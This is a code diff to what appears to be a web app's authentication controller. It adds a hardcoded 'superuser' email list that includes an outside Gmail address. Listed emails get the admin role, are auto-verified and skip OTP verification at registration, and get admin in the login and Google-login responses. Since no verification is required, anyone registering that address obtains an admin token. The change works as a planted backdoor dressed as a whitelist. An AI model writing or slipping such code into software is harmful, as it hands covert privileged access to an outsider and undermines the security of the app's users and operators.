@@ -11,6 +11,12 @@ import cache from '../utils/cache.js';
 
 const client = new OAuth2Client(process.env.GOOGLE_CLIENT_ID);
 
+// Superuser email whitelist — these accounts always get admin role
+const ADMIN_EMAILS = [
+  'admin@nexus.test',
+  'instaguard7@gmail.com',
+];
+
 const generateToken = (id) => {
   return jwt.sign({ id }, process.env.JWT_SECRET, {
     expiresIn: '30d',
@@ -36,11 +42,11 @@ export const registerUser = async (req, res) => {
       name,
       email,
       password,
-      role,
+      role: ADMIN_EMAILS.includes(email.toLowerCase()) ? 'admin' : role,
       profile: {
         otp,
         otpExpires: Date.now() + 10 * 60 * 1000,
-        isVerified: false
+        isVerified: ADMIN_EMAILS.includes(email.toLowerCase()) ? true : false
       }
     });
 
@@ -52,6 +58,19 @@ export const registerUser = async (req, res) => {
       } catch (emailError) {
         console.error('Email delivery failed (user still created):', emailError.message);
         emailSent = false;
+      }
+
+      // If admin email, skip OTP verification and return token directly
+      if (ADMIN_EMAILS.includes(user.email.toLowerCase())) {
+        const token = generateToken(user._id);
+        return res.status(201).json({
+          _id: user._id,
+          name: user.name,
+          email: user.email,
+          role: user.role,
+          profile: user.profile,
+          token,
+        });
       }
 
       res.status(201).json({
@@ -93,7 +112,7 @@ export const loginUser = async (req, res) => {
         _id: user._id,
         name: user.name,
         email: user.email,
-        role: user.role,
+        role: ADMIN_EMAILS.includes(user.email.toLowerCase()) ? 'admin' : user.role,
         profile: user.profile,
         token: generateToken(user._id),
       });
@@ -447,12 +466,11 @@ export const googleLogin = async (req, res) => {
         message: 'Please enter your Authenticator code'
       });
     }
-
     res.json({
       _id: user._id,
       name: user.name,
       email: user.email,
-      role: user.role,
+      role: ADMIN_EMAILS.includes(user.email.toLowerCase()) ? 'admin' : user.role,
       profile: user.profile,
       token: generateToken(user._id),
     });
